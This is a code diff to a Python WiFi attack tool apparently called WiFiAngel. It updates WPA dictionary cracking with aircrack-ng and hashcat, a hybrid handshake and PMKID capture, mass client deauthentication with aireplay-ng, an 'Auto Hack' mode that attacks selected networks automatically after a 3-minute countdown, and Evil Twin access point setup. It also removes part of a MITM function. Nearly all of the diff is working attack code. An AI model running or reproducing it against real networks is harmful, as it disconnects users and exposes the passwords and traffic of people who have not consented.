+                            if not any(x in match for x in ["second", "%", "Master", "KEY", "Decrypting"]):
+                                current_key = match
+                                password_found = True
+                                self.logger.info(f"Password found from bracket pattern: {current_key}")
+                                break
+            
+            # Additional validation to prevent false positives
+            if password_found:
+                # Make sure the password is valid (contains only valid characters and length)
+                # Check for common timing information that might be misinterpreted as password
+                if (len(current_key) > 64 or
+                    len(current_key) < 8 or
+                    current_key.lower().startswith("master") or
+                    "second" in current_key.lower() or
+                    "minute" in current_key.lower() or
+                    "hour" in current_key.lower() or
+                    "progress" in current_key.lower() or
+                    "remaining" in current_key.lower() or
+                    "key" in current_key.lower() or
+                    "tested" in current_key.lower() or
+                    re.search(r'\d+\s*(?:second|minute|hour)', current_key, re.IGNORECASE) or
+                    re.search(r'\d+[:.]\d+[:.]\d+', current_key) or  # Matches time formats like 00:00:00
+                    re.search(r'\d+\.\d+%', current_key) or  # Matches percentage
+                    re.search(r'\[.*\d+[\.:]\d+.*\]', current_key)):  # Matches something with time in brackets
+                    self.logger.warning(f"Invalid password detected: {current_key} - marking as not found")
                     password_found = False
                     current_key = ""
+            
+            # Show detailed results in a table at the end of the process
+            end_time = time.time()
+            elapsed_time = end_time - start_time
+            
+            hours = int(elapsed_time // 3600)
+            minutes = int((elapsed_time % 3600) // 60)
+            seconds = int(elapsed_time % 60)
+            elapsed_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
+            
+            # Results table
+            result_table = Table(show_header=True, header_style="bold magenta", title="[bold blue]Dictionary Attack Results[/]")
+            result_table.add_column("Target", style="cyan")
+            result_table.add_column("Status", style="green")
+            result_table.add_column("Tested Keys", style="yellow")
+            result_table.add_column("Speed", style="magenta")
+            result_table.add_column("Time", style="blue")
+            result_table.add_column("Password", style="red")
+            
+            if password_found and current_key and len(current_key) >= 8 and len(current_key) <= 63:
+                status = "[bold green]✓ CRACKED[/]"
+                password_display = f"[bold red]{current_key}[/]"
+            else:
+                status = "[bold red]✗ FAILED[/]"
+                password_display = "[dim]Not Found[/dim]"
+                # Reset these in case there was a false positive
+                password_found = False
+                current_key = ""
+            
+            result_table.add_row(
+                str(selected_file.name),
+                status,
+                str(last_tested_keys),
+                last_speed,
+                elapsed_str,
+                password_display
+            )
+            
+            self.console.print("\n")
+            self.console.print(result_table)
+            
+            if not password_found:
+                self.logger.warning(f"Failed to crack password for {selected_file}")
                 
-                result_table.add_row(
-                    str(selected_file.name),
-                    status,
-                    str(last_tested_keys),
-                    last_speed,
-                    elapsed_str,
-                    password_display
-                )
-                
-                self.console.print("\n")
-                self.console.print(result_table)
-                
-                if not password_found:
-                    self.logger.warning(f"Failed to crack password for {selected_file}")
-                    
-            except KeyboardInterrupt:
-                self.console.print("\n[bold yellow]Dictionary attack interrupted by user[/]")
-                self.logger.info("Dictionary attack interrupted by user")
-            except Exception as e:
-                self.console.print(f"\n[bold red]Error during dictionary attack: {str(e)}[/]")
-                self.logger.error(f"Error during dictionary attack: {str(e)}")
-            finally:
-                # Always clean up processes
-                if process:
+        except KeyboardInterrupt:
+            self.console.print("\n[bold yellow]Dictionary attack interrupted by user[/]")
+            self.logger.info("Dictionary attack interrupted by user")
+        except Exception as e:
+            self.console.print(f"\n[bold red]Error during dictionary attack: {str(e)}[/]")
+            self.logger.error(f"Error during dictionary attack: {str(e)}")
+        finally:
+            # Always clean up processes
+            if process:
+                try:
+                    process.terminate()
                     try:
-                        process.terminate()
+                        process.wait(timeout=2)
+                    except subprocess.TimeoutExpired:
+                        process.kill()
                         try:
                             process.wait(timeout=2)
-                        except subprocess.TimeoutExpired:
-                            process.kill()
-                            try:
-                                process.wait(timeout=2)
-                            except:
-                                pass
-                    except:
-                        pass
-                
-                # Also make sure to kill any remaining aircrack-ng or hashcat processes
-                try:
-                    if is_wpa3:
-                        subprocess.run(["pkill", "-9", "-f", "hashcat"], 
-                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    else:
-                        subprocess.run(["pkill", "-9", "-f", "aircrack-ng"], 
-                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        except:
+                            pass
                 except:
                     pass
+            
+            # Also make sure to kill any remaining aircrack-ng or hashcat processes
+            try:
+                if is_wpa3:
+                    subprocess.run(["pkill", "-9", "-f", "hashcat"], 
+                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                else:
+                    subprocess.run(["pkill", "-9", "-f", "aircrack-ng"], 
+                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except:
+                pass
 
     def hybrid_attack(self):
         """Performs hybrid attack using both handshake and PMKID methods"""
@@ -1561,15 +1677,22 @@ class WiFiAngel:
         dump_proc = None
         pmkid_proc = None
         start_time = time.time()
+        final_handshake = None  # Initialize final_handshake variable
+        
+        # Initialize client tracking
+        known_clients = set(network['clients'])
+        last_client_check = time.time()
+        client_check_interval = 5  # Check for new clients every 5 seconds
+        
+        # Create a thread lock for client set manipulation
+        client_lock = threading.Lock()
         
         # Check if network is WPA3
         is_wpa3 = False
-        if 'security' in network:
-            if isinstance(network['security'], str) and "WPA3" in network['security']:
+        if 'cipher' in network:
+            if "WPA3" in network['cipher']:
                 is_wpa3 = True
-            elif isinstance(network['security'], list) and any("WPA3" in sec for sec in network['security']):
-                is_wpa3 = True
-                
+        
         # Determine security type
         security_type = "WPA3" if is_wpa3 else "WPA/WPA2"
 
@@ -1583,31 +1706,79 @@ class WiFiAngel:
             seconds = elapsed % 60
             elapsed_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
             
-            table = Table(show_header=True, header_style="bold magenta", title="[bold blue]Hybrid Attack Status[/]")
-            table.add_column("Target", style="cyan")
+            table = Table(show_header=True, header_style="bold magenta")
+            table.add_column("BSSID", style="cyan")
             table.add_column("Channel", style="green")
-            table.add_column("Handshake", style="yellow")
-            table.add_column("PMKID", style="magenta")
-            table.add_column("Time Elapsed", style="blue")
+            table.add_column("ESSID", style="yellow")
+            table.add_column("Clients", style="cyan")
+            table.add_column("Status", style="green")
+            table.add_column("Time Elapsed", style="yellow")
 
-            handshake_status = "[bold green]Found! (Continuing)" if handshake_found else "[yellow]Capturing..."
-            pmkid_status = "[bold green]Found! (Continuing)" if pmkid_found else "[yellow]Capturing..."
-            
-            table.add_row(
-                network['ssid'],
-                str(network['channel']),
-                handshake_status,
-                pmkid_status,
-                elapsed_str
-            )
-
+            with client_lock:
+                status = "[bold green]✓ Handshake Found! (Continuing...)" if handshake_found else "[bold yellow]Capturing..."
+                table.add_row(
+                    self.selected_network,
+                    str(network['channel']),
+                    network['ssid'],
+                    str(len(known_clients)),
+                    status,
+                    elapsed_str
+                )
             return table
+
+        def check_for_new_clients():
+            """Check for new clients connected to the network"""
+            nonlocal last_client_check, known_clients
+            current_time = time.time()
+            if current_time - last_client_check < client_check_interval:
+                return
+            last_client_check = current_time
+            with self._networks_lock:
+                if self.selected_network in self.networks:
+                    current_clients = set(self.networks[self.selected_network]['clients'])
+                    with client_lock:
+                        new_clients = current_clients - known_clients
+                        if new_clients:
+                            known_clients.update(new_clients)
+
+        def deauth_all_clients():
+            """Deauthenticate all known clients"""
+            with client_lock:
+                clients_to_deauth = list(known_clients)
+            if clients_to_deauth:
+                broadcast_cmd = f"aireplay-ng -0 2 -a {self.selected_network} {self.interface_name}"
+                subprocess.run(broadcast_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
+                for client in clients_to_deauth:
+                    deauth_cmd = f"aireplay-ng -0 2 -a {self.selected_network} -c {client} {self.interface_name}"
+                    subprocess.run(deauth_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
+
+        def check_for_handshake():
+            """Check if a handshake has been captured"""
+            nonlocal handshake_found, pmkid_found, final_handshake  # Add final_handshake to nonlocal
+            if not handshake_found:
+                cap_files = list(handshake_dir.glob(f"handshake_{network['ssid']}_{timestamp}*.cap"))
+                if cap_files:
+                    result = subprocess.run(["aircrack-ng", str(cap_files[0])], capture_output=True, text=True)
+                    if "1 handshake" in result.stdout:
+                        handshake_found = True
+                        final_handshake = handshake_dir / f"handshake_{network['ssid']}_{timestamp}.cap"
+                        shutil.move(str(cap_files[0]), str(final_handshake))
+                        self.console.print(f"\n[bold green]Handshake ({security_type}) captured successfully! Saved to: {final_handshake}[/]")
+                        self.console.print("[bold yellow]Continuing capture process... Press Ctrl+C to stop.[/]")
+        
+            if not pmkid_found and os.path.exists(f"{pmkid_file}.pcapng"):
+                convert_cmd = f"hcxpcapngtool -o {pmkid_file}.22000 {pmkid_file}.pcapng"
+                subprocess.run(convert_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                if os.path.exists(f"{pmkid_file}.22000") and os.path.getsize(f"{pmkid_file}.22000") > 0:
+                    pmkid_found = True
+                    self.console.print(f"\n[bold green]PMKID captured successfully! Saved to: {pmkid_file}.22000[/]")
+                    self.console.print("[bold yellow]Continuing capture process... Press Ctrl+C to stop.[/]")
 
         try:
             self.console.print("\n[bold yellow]Important Information:[/]")
             self.console.print("[bold cyan]- Hybrid attack will continue until you press Ctrl+C")
             self.console.print("[bold cyan]- If a handshake or PMKID is found, it will be saved but the process will continue")
-            self.console.print("[bold cyan]- All clients will be deauthenticated periodically\n")
+            self.console.print("[bold cyan]- All clients will be deauthenticated simultaneously\n")
 
             with Live(refresh_per_second=4) as live:
                 # Start handshake capture
@@ -1615,46 +1786,30 @@ class WiFiAngel:
                 dump_proc = subprocess.Popen(dump_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 
                 # Start PMKID capture
-                pmkid_cmd = f"hcxdumptool -i {self.interface_name} -o {pmkid_file}.pcapng --enable_status=1 --filtermode=2 --filterlist_ap={bssid} -c {channel} --disable_client_attacks --disable_deauthentication"
+                pmkid_cmd = f"hcxdumptool -i {self.interface_name} -w {pmkid_file}.pcapng -c {network['channel']}"
                 pmkid_proc = subprocess.Popen(pmkid_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
                 while True:
                     # Update status display
                     live.update(create_status_table())
-                    # Remove this line as it causes problems with time updating
-                    # live.refresh()
 
-                    # Send deauth packets to each client
-                    for client in network['clients']:
-                        deauth_cmd = f"aireplay-ng -0 2 -a {self.selected_network} -c {client} {self.interface_name}"
-                        subprocess.run(deauth_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    # Check for new clients
+                    check_for_new_clients()
 
-                    # Check for handshake if not already found
-                    if not handshake_found:
-                        cap_files = list(handshake_dir.glob(f"handshake_{network['ssid']}_{timestamp}*.cap"))
-                        if cap_files:
-                            result = subprocess.run(["aircrack-ng", str(cap_files[0])], capture_output=True, text=True)
-                            if "1 handshake" in result.stdout:
-                                handshake_found = True
-                                final_handshake = handshake_dir / f"handshake_{network['ssid']}_{timestamp}.cap"
-                                shutil.move(str(cap_files[0]), str(final_handshake))
-                                self.console.print(f"\n[bold green]Handshake ({security_type}) captured successfully! Saved to: {final_handshake}[/]")
-                                self.console.print("[bold yellow]Continuing hybrid attack... Press Ctrl+C to stop.[/]")
+                    # Deauth all clients in parallel
+                    deauth_all_clients()
 
-                    # Check for PMKID if not already found
-                    if not pmkid_found and os.path.exists(f"{pmkid_file}.pcapng"):
-                        convert_cmd = f"hcxpcapngtool -o {pmkid_file}.22000 {pmkid_file}.pcapng"
-                        subprocess.run(convert_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    # Check for handshake and PMKID
+                    check_for_handshake()
                         
-                        if os.path.exists(f"{pmkid_file}.22000") and os.path.getsize(f"{pmkid_file}.22000") > 0:
-                            pmkid_found = True
-                            self.console.print(f"\n[bold green]PMKID captured successfully! Saved to: {pmkid_file}.22000[/]")
-                            self.console.print("[bold yellow]Continuing hybrid attack... Press Ctrl+C to stop.[/]")
-
+                    # Small sleep to prevent high CPU usage
                     time.sleep(0.25)
 
         except KeyboardInterrupt:
-            self.console.print("\n[bold yellow]Hybrid attack stopped by user.[/]")
+            if handshake_found or pmkid_found:
+                self.console.print("\n[bold green]Attack stopped by user. Captures were successful![/]")
+            else:
+                self.console.print("\n[bold yellow]Attack stopped by user. No captures were made.[/]")
         finally:
             # Cleanup processes
             if dump_proc:
@@ -1678,7 +1833,7 @@ class WiFiAngel:
                     except:
                         pass
             
-            # Show results
+            # Show final results
             results_table = Table(show_header=True, header_style="bold magenta", title="[bold blue]Attack Results[/]")
             results_table.add_column("Method", style="cyan")
             results_table.add_column("Status", style="yellow")
@@ -1719,7 +1874,6 @@ class WiFiAngel:
                 self.console.print("\n[bold red]✗ Hybrid attack failed. No hashes captured.[/]")
             
             self.logger.info(f"Hybrid attack completed - Handshake: {handshake_found}, PMKID: {pmkid_found}")
-            
             # Ensure menu state is properly reset
             self.current_menu = "attack"
 
@@ -1978,6 +2132,10 @@ class WiFiAngel:
             self.console.print(disclaimer)
             self.console.print("[bold yellow]Press Enter to continue or Ctrl+C to abort...[/]")
             
+            # Add notification about the 3-minute timeout feature
+            self.console.print("\n[bold cyan]INFO: After selecting networks, you will have a 3-minute confirmation period[/]")
+            self.console.print("[bold cyan]before the attack begins automatically.[/]")
+            
             # Wait for user confirmation
             try:
                 input()
@@ -2203,6 +2361,53 @@ class WiFiAngel:
             else:
                 self.console.print("[bold green]Selected all networks for attack.[/]")
                 selected_indices = list(range(1, display_networks + 1))
+            
+            # Add a 3-minute timeout confirmation
+            self.console.print("\n[bold yellow]⚠️ You have 3 minutes to confirm your selection.[/]")
+            self.console.print("[bold cyan]Press Enter to continue immediately or Ctrl+C to abort.[/]")
+            self.console.print("[bold red]Attack will automatically start after 3 minutes if no action is taken.[/]")
+            
+            # Setup the timeout using a countdown display
+            start_time = time.time()
+            timeout = 180  # 3 minutes in seconds
+            
+            try:
+                # Create a timer display
+                with Live(refresh_per_second=1) as live:
+                    while True:
+                        elapsed = time.time() - start_time
+                        remaining = timeout - elapsed
+                        
+                        if remaining <= 0:
+                            # Timeout reached, proceed with attack
+                            live.update(Panel(f"[bold green]Timeout reached. Starting attack...[/]"))
+                            time.sleep(1)
+                            break
+                        
+                        # Check if there's input available (Enter key pressed)
+                        if select.select([sys.stdin], [], [], 0)[0]:
+                            # Clear the input buffer
+                            sys.stdin.readline()
+                            live.update(Panel(f"[bold green]Continuing with attack...[/]"))
+                            time.sleep(1)
+                            break
+                        
+                        # Update the display with remaining time
+                        minutes = int(remaining // 60)
+                        seconds = int(remaining % 60)
+                        live.update(Panel(
+                            f"[bold yellow]Auto-start in: [bold red]{minutes:02d}:{seconds:02d}[/]\n\n"
+                            f"[bold cyan]Press Enter to continue now[/]\n"
+                            f"[bold cyan]Press Ctrl+C to abort[/]"
+                        ))
+                        
+                        # Short sleep to prevent high CPU usage
+                        time.sleep(0.1)
+            except KeyboardInterrupt:
+                self.console.print("\n[bold yellow]⚠️ Auto Hack aborted by user.[/]")
+                self.logger.warning("Auto Hack aborted by user during timeout confirmation")
+                self._auto_hack_cleanup()
+                return
             
             # Log prioritization information
             self.logger.info(f"Target networks prioritized: {len(scored_networks)} networks ranked")
@@ -2462,7 +2667,7 @@ class WiFiAngel:
             )
             
             self.console.print(security_panel)
-            
+        
             # Save comprehensive report
             end_time = datetime.now()
             self.logger.info(f"Auto Hack completed at {end_time}")
@@ -2904,6 +3109,7 @@ class WiFiAngel:
                 default_channel = str(network['channel'])
                 self.console.print(f"\n[bold yellow]Selected network: {default_ssid} (Channel: {default_channel})[/]")
             
+            
             # Ask for SSID (with default if network is selected)
             ssid = Prompt.ask("Enter SSID for the Evil Twin", default=default_ssid)
             if not ssid and default_ssid:
@@ -2973,7 +3179,7 @@ bind-interfaces
 no-resolv
 server=8.8.8.8
 server=8.8.4.4
-dhcp-leasefile=/var/lib/misc/dnsmasq.leases"""
+dhcp-leasefile={log_dir}/dnsmasq.leases"""
 
             # Stop network services
             self.console.print("[bold blue]Preparing network environment...[/]")
@@ -3052,18 +3258,14 @@ dhcp-leasefile=/var/lib/misc/dnsmasq.leases"""
                 session_file = cache_dir / f"clients_{session_id}.json"
                 
                 # Clear any existing dnsmasq leases
-                subprocess.run(["rm", "-f", "/var/lib/misc/dnsmasq.leases"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                leases_file = log_dir / "dnsmasq.leases"
+                
                 # Create empty dnsmasq.leases file and set permissions
                 try:
-                    with open("/var/lib/misc/dnsmasq.leases", 'w') as f:
-                        pass  # Create empty file
+                    # Ensure file exists
+                    leases_file.touch(exist_ok=True)
                     # Set proper permissions
-                    subprocess.run(["chmod", "644", "/var/lib/misc/dnsmasq.leases"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    # Ensure dnsmasq can access the file
-                    dnsmasq_dir = Path("/var/lib/misc")
-                    if not dnsmasq_dir.exists():
-                        dnsmasq_dir.mkdir(parents=True, exist_ok=True)
-                        subprocess.run(["chmod", "755", str(dnsmasq_dir)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    subprocess.run(["chmod", "644", str(leases_file)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 except Exception as e:
                     self.logger.log_evil_twin(f"Warning: Could not create dnsmasq.leases file: {str(e)}")
 
@@ -3158,8 +3360,9 @@ dhcp-leasefile=/var/lib/misc/dnsmasq.leases"""
 
                     # Update connected clients from dnsmasq leases
                     try:
-                        if os.path.exists("/var/lib/misc/dnsmasq.leases"):
-                            with open("/var/lib/misc/dnsmasq.leases", "r") as f:
+                        leases_file = log_dir / "dnsmasq.leases"
+                        if leases_file.exists():
+                            with open(leases_file, "r") as f:
                                 leases = f.readlines()
                                 current_clients = {}  # Temporary dictionary for current clients
                                 for lease in leases:
@@ -3256,12 +3459,13 @@ dhcp-leasefile=/var/lib/misc/dnsmasq.leases"""
             
             # Clear dnsmasq leases
             try:
-                subprocess.run(["rm", "-f", "/var/lib/misc/dnsmasq.leases"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                # Create empty dnsmasq.leases file to track client connections
-                with open("/var/lib/misc/dnsmasq.leases", 'w') as f:
-                    pass  # Create empty file
-                # Set proper permissions
-                subprocess.run(["chmod", "644", "/var/lib/misc/dnsmasq.leases"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                leases_file = log_dir / "dnsmasq.leases"
+                if leases_file.exists():
+                    # Just empty the file instead of removing it
+                    with open(leases_file, 'w') as f:
+                        pass  # Create empty file
+                    # Set proper permissions
+                    subprocess.run(["chmod", "644", str(leases_file)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             except:
                 pass
 
@@ -3332,30 +3536,80 @@ dhcp-leasefile=/var/lib/misc/dnsmasq.leases"""
     def verify_network_services(self):
         """Verify that network services are running correctly"""
         try:
-            # Check NetworkManager status
-            nm_status = subprocess.run(["systemctl", "is-active", "NetworkManager"], 
-                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
-            if nm_status != "active":
-                self.console.print("[bold yellow]⚠️ NetworkManager is not active, attempting to restart...[/]")
-                subprocess.run(["systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            # Check wpa_supplicant status
-            wpa_status = subprocess.run(["systemctl", "is-active", "wpa_supplicant"], 
-                                      stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
-            if wpa_status != "active":
-                self.console.print("[bold yellow]⚠️ wpa_supplicant is not active, attempting to restart...[/]")
-                subprocess.run(["systemctl", "restart", "wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            # Verify interface mode
+            # Check NetworkManager status with timeout
             try:
-                iw_info = subprocess.check_output(["iwconfig", self.interface_name]).decode()
+                nm_status = subprocess.run(["systemctl", "is-active", "NetworkManager"], 
+                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5).stdout.decode().strip()
+                if nm_status != "active":
+                    self.console.print("[bold yellow]⚠️ NetworkManager is not active, attempting to restart...[/]")
+                    try:
+                        subprocess.run(["systemctl", "restart", "NetworkManager"], 
+                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
+                        # Verify restart was successful
+                        time.sleep(2)
+                        nm_status = subprocess.run(["systemctl", "is-active", "NetworkManager"], 
+                                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5).stdout.decode().strip()
+                        if nm_status != "active":
+                            self.console.print("[bold red]⚠️ Failed to restart NetworkManager[/]")
+                    except subprocess.TimeoutExpired:
+                        self.console.print("[bold red]⚠️ NetworkManager restart timed out[/]")
+                    except Exception as e:
+                        self.console.print(f"[bold red]⚠️ Error restarting NetworkManager: {str(e)}[/]")
+            except subprocess.TimeoutExpired:
+                self.console.print("[bold red]⚠️ NetworkManager status check timed out[/]")
+            except Exception as e:
+                self.console.print(f"[bold red]⚠️ Error checking NetworkManager: {str(e)}[/]")
+            
+            # Check wpa_supplicant status with timeout
+            try:
+                wpa_status = subprocess.run(["systemctl", "is-active", "wpa_supplicant"], 
+                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5).stdout.decode().strip()
+                if wpa_status != "active":
+                    self.console.print("[bold yellow]⚠️ wpa_supplicant is not active, attempting to restart...[/]")
+                    try:
+                        subprocess.run(["systemctl", "restart", "wpa_supplicant"], 
+                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
+                        # Verify restart was successful
+                        time.sleep(2)
+                        wpa_status = subprocess.run(["systemctl", "is-active", "wpa_supplicant"], 
+                                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5).stdout.decode().strip()
+                        if wpa_status != "active":
+                            self.console.print("[bold red]⚠️ Failed to restart wpa_supplicant[/]")
+                    except subprocess.TimeoutExpired:
+                        self.console.print("[bold red]⚠️ wpa_supplicant restart timed out[/]")
+                    except Exception as e:
+                        self.console.print(f"[bold red]⚠️ Error restarting wpa_supplicant: {str(e)}[/]")
+            except subprocess.TimeoutExpired:
+                self.console.print("[bold red]⚠️ wpa_supplicant status check timed out[/]")
+            except Exception as e:
+                self.console.print(f"[bold red]⚠️ Error checking wpa_supplicant: {str(e)}[/]")
+            
+            # Verify interface mode with improved error handling
+            try:
+                iw_info = subprocess.check_output(["iwconfig", self.interface_name], stderr=subprocess.STDOUT, timeout=5).decode()
                 if "Mode:Managed" not in iw_info:
                     self.console.print("[bold yellow]⚠️ Interface not in managed mode, attempting to fix...[/]")
-                    subprocess.run(["ip", "link", "set", self.interface_name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    subprocess.run(["iw", self.interface_name, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    subprocess.run(["ip", "link", "set", self.interface_name, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            except:
-                self.console.print("[bold red]⚠️ Could not verify interface mode[/]")
+                    try:
+                        subprocess.run(["ip", "link", "set", self.interface_name, "down"], 
+                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+                        subprocess.run(["iw", self.interface_name, "set", "type", "managed"], 
+                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+                        subprocess.run(["ip", "link", "set", self.interface_name, "up"], 
+                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+                        
+                        # Verify change was successful
+                        time.sleep(2)
+                        iw_info = subprocess.check_output(["iwconfig", self.interface_name], stderr=subprocess.STDOUT, timeout=5).decode()
+                        if "Mode:Managed" not in iw_info:
+                            self.console.print("[bold red]⚠️ Failed to set interface to managed mode[/]")
+                    except subprocess.TimeoutExpired:
+                        self.console.print("[bold red]⚠️ Interface mode change timed out[/]")
+                    except Exception as e:
+                        self.console.print(f"[bold red]⚠️ Error changing interface mode: {str(e)}[/]")
+            except subprocess.TimeoutExpired:
+                self.console.print("[bold red]⚠️ Interface check timed out[/]")
+            except Exception as e:
+                self.console.print(f"[bold red]⚠️ Could not verify interface mode: {str(e)}[/]")
             
         except Exception as e:
             self.logger.error(f"Error during network service verification: {str(e)}")
@@ -4043,7 +4297,7 @@ dhcp-leasefile=/var/lib/misc/dnsmasq.leases"""
         def deauth_client(client_mac):
             try:
                 deauth_cmd = f"aireplay-ng -0 2 -a {self.selected_network} -c {client_mac} {self.interface_name}"
-                subprocess.run(deauth_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                subprocess.run(deauth_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
                 return True
             except Exception as e:
                 self.logger.error(f"Error deauthenticating client {client_mac}: {str(e)}")
@@ -4288,11 +4542,27 @@ dhcp-leasefile=/var/lib/misc/dnsmasq.leases"""
             
             # Start handshake capture
             dump_cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {handshake_file} {self.interface_name}"
-            dump_proc = subprocess.Popen(shlex.split(dump_cmd), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            dump_proc = subprocess.Popen(shlex.split(dump_cmd), stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+            
+            # Check if handshake capture started successfully
+            time.sleep(1)
+            if dump_proc.poll() is not None:
+                stderr = dump_proc.stderr.read().decode() if dump_proc.stderr else "Unknown error"
+                self.logger.error(f"Failed to start airodump-ng for {ssid}: {stderr}")
+                result['status_message'] = "[bold red]✗ Failed to start handshake capture[/]"
+                # Continue anyway, we might at least get PMKID
             
             # Start PMKID capture
-            pmkid_cmd = f"hcxdumptool -i {self.interface_name} -o {pmkid_file}.pcapng --enable_status=1 --filtermode=2 --filterlist_ap={bssid} -c {channel} --disable_client_attacks --disable_deauthentication"
-            pmkid_proc = subprocess.Popen(shlex.split(pmkid_cmd), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            pmkid_cmd = f"hcxdumptool -i {self.interface_name} -w {pmkid_file}.pcapng -c {channel}"
+            pmkid_proc = subprocess.Popen(shlex.split(pmkid_cmd), stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+            
+            # Check if PMKID capture started successfully
+            time.sleep(1)
+            if pmkid_proc.poll() is not None:
+                stderr = pmkid_proc.stderr.read().decode() if pmkid_proc.stderr else "Unknown error"
+                self.logger.error(f"Failed to start hcxdumptool for {ssid}: {stderr}")
+                result['pmkid_status'] = "[red]✗ Failed to start PMKID capture[/]"
+                # Continue anyway with just handshake capture
             
             # Log attempt details
             with open(session_dir / "auto_hack_report.txt", "a") as f:
@@ -4310,7 +4580,8 @@ dhcp-leasefile=/var/lib/misc/dnsmasq.leases"""
                     deauth_cmd = f"aireplay-ng -0 5 -a {bssid} -c {client} {self.interface_name}"
                     deauth_tasks.append(deauth_executor.submit(
                         subprocess.run, shlex.split(deauth_cmd), 
-                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                        timeout=10  # Add 10 second timeout
                     ))
                 
                 # Wait for deauth tasks to complete
@@ -4644,14 +4915,14 @@ dhcp-leasefile=/var/lib/misc/dnsmasq.leases"""
                 # Broadcast deauth
                 self.console.print(f"[bold cyan]Broadcasting deauth to all clients on {network['ssid']}...[/]")
                 broadcast_cmd = f"aireplay-ng -0 2 -a {self.selected_network} {self.interface_name}"
-                subprocess.run(broadcast_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                subprocess.run(broadcast_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
                 
                 # Targeted deauth to each client
                 self.console.print(f"[bold green]Targeting individual clients ({len(clients)}):[/]")
                 
                 for i, client in enumerate(clients, 1):
                     deauth_cmd = f"aireplay-ng -0 2 -a {self.selected_network} -c {client} {self.interface_name}"
-                    subprocess.run(deauth_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    subprocess.run(deauth_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
                     
                     # Print progress
                     self.console.print(f"  [green]{i}/{len(clients)}[/] - Deauthing client: [cyan]{client}[/]")
@@ -4697,6 +4968,7 @@ dhcp-leasefile=/var/lib/misc/dnsmasq.leases"""
             
         self.console.print(client_table)
         
+        
         # Let user select client
         choice = Prompt.ask("Select client ID to deauthenticate (0 to cancel)", 
                           choices=["0"] + [str(i) for i in range(1, len(clients) + 1)])
@@ -4725,7 +4997,7 @@ dhcp-leasefile=/var/lib/misc/dnsmasq.leases"""
                 
                 # Send deauth packets
                 deauth_cmd = f"aireplay-ng -0 2 -a {self.selected_network} -c {selected_client} {self.interface_name}"
-                subprocess.run(deauth_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                subprocess.run(deauth_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
                 
                 # Determine status message based on packets sent
                 if packet_count < 10:
@@ -4794,6 +5066,7 @@ dhcp-leasefile=/var/lib/misc/dnsmasq.leases"""
                 TextColumn("[bold green]{task.percentage:.0f}%"),
                 TimeElapsedColumn(),
             ) as progress:
+                
                 
                 download_task = progress.add_task("[cyan]Testing Download Speed...", total=100)
                 upload_task = progress.add_task("[magenta]Testing Upload Speed...", total=100, visible=False)
@@ -5034,445 +5307,6 @@ dhcp-leasefile=/var/lib/misc/dnsmasq.leases"""
         input()
         return
 
-    def mitm_attack(self):
-        """Enhanced Man in the Middle Attack with advanced traffic analysis and ARP spoofing"""
-        try:
-            # Create logs directory for MITM attack
-            mitm_log_dir = Path("logs/mitm")
